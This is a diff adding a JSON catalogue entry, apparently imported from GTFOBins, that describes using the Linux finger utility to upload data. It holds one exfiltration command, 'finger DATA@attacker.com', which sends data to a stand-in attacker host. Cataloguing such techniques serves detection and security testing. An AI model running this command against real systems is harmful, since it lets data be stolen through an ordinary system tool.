@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-finger-upload",
+  "name": "GTFOBins · finger (upload)",
+  "command": "finger DATA@attacker.com",
+  "description": "Use finger to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "finger",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/finger/#upload",
+  "upstream_id": "finger/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/finger/"
+    }
+  ]
+}
